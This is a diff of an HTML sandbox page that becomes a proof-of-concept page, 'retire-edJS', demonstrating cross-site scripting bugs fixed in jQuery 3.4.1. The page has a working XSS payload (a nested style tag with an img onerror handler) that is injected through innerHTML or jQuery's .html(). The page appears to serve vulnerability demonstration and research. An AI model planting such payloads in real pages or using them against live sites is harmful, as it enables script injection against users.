@@ -1,9 +1,32 @@
 <h1>Sandbox Page</h1>
 
-<script src="https://code.jquery.com/jquery-1.8.3.js">
-   
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>retire-edJS</title>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js"></script>
+</head>
+<body>
+<script>
+function test(n,jq){
+    sanitizedHTML = document.getElementById('poc'+n).innerHTML;
+    if(jq){
+        $('#div').html(sanitizedHTML);
+    }else{
+        div.innerHTML=sanitizedHTML;
+    }
+}
 </script>
-<form>
-    <input id="test" placeholder="stuff here" size="30" value="" />
-    <input type="submit" value="Submit" />
- </form>
+<h1>retire-edJS</h1>
+<p>PoCs of XSS bugs fixed in</p>
+
+<h2>PoC 1</h2>
+<button onclick="test(1)">Assign to innerHTML</button> <button onclick="test(1,true)">Append via .html()</button>
+<xmp id="poc1">
+<style><style /><img src=x onerror=alert(1)> 
+</xmp>
+
+<div id="div"></div>
+</body>
+</html>
